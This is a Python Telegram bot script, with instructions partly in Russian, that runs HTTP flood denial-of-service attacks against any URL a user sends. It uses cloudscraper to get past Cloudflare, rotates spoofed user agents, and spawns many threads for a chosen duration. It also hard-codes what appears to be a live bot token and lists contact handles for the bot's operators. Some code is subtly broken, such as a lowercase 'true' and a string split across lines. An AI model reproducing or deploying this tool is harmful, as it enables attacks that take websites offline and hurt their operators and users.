import telebot
import threading
import cloudscraper
import datetime
import time
import random

stop_attack = true

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Mi 10T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
    ]
    return random.choice(user_agents)

def launch_attack(url, threads, attack_time):
    global stop_attack
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(attack_time))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(threads) and not stop_attack:
        try:
            th = threading.Thread(target=attack_cfb, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

def attack_cfb(url, until_datetime, scraper):
    global stop_attack
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0 and not stop_attack:
        try:
            headers = {"User-Agent": generate_user_agent()}
            scraper.get(url, headers=headers, timeout=15)
        except:
            pass

bot = telebot.TeleBot("6229938354:AAH3I0u4httA0ERatlFY1cY_JI-pr8UAtsE")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "attacks only work on sites hosted by cloudflare | чтобы начать аттаку используйте команду /attack после чего скиньте боту ссылку на сайт и выберете количество threads желательно до  от 1 до 999 и количество времени от 10 до 1200 секунд остановить аттаку /stop
Если у вас возникают вопросы по боту обращайтесь - @fyuman444 или @RealmeAgent")

@bot.message_handler(commands=['attack'])
def attack(message):
    global stop_attack
    if stop_attack:
        stop_attack = False
        bot.send_message(message.chat.id, "attack resumed")
    else:
        bot.send_message(message.chat.id, "enter the target url:")
        bot.register_next_step_handler(message, attack_url)

def attack_url(message):
    global stop_attack
    url = message.text
    bot.send_message(message.chat.id, "threads:")
    bot.register_next_step_handler(message, attack_threads, url)

def attack_threads(message, url):
    global stop_attack
    threads = message.text
    bot.send_message(message.chat.id, "Введите время аttакu (в секундах):")
    bot.register_next_step_handler(message, attack_time, url, threads)

def attack_time(message, url, threads):
    global stop_attack
    attack_time = message.text
    bot.send_message(message.chat.id, f"Аttака запущена на {url} с использованием {threads} потоков на {attack_time} секунд.")
    stop_attack = False
    threading.Thread(target=launch_attack, args=(url, threads, attack_time)).start()

@bot.message_handler(commands=['stop'])
def stop(message):
    global stop_attack
    stop_attack = True
    bot.send_message(message.chat.id, "attack stopped")

bot.polling()
